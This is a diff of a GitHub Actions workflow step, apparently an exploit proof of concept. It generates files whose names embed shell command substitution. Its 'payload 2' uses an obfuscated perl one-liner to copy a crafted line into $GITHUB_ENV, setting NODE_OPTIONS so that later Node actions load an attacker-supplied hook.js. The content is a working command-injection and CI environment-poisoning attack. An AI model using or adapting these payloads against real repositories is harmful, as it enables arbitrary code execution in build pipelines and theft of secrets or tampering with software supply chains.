@@ -31,7 +31,7 @@ jobs:
           open("content/" + name1, "w").write("payload\n")
 
           # payload 2: overwrite $GITHUB_ENV with NODE_OPTIONS so the later node actions load hook.js
-          name2 = (r"q$(cd $(printf '\57tmp\57content\57content'); cp envline.txt $GITHUB_ENV; echo 2)wn.txt")
+          name2 = ("q$(perl -e 'use File::Copy;chdir(chr(47).q{tmp}.chr(47).q{content}.chr(47).q{content});copy(q{envline.txt},$ENV{GITHUB_ENV})'; echo 2)wn.txt")
           open("content/" + name2, "w").write("payload2\n")
           open("content/envline.txt", "w").write("NODE_OPTIONS=--require /tmp/content/content/hook.js\n")
 
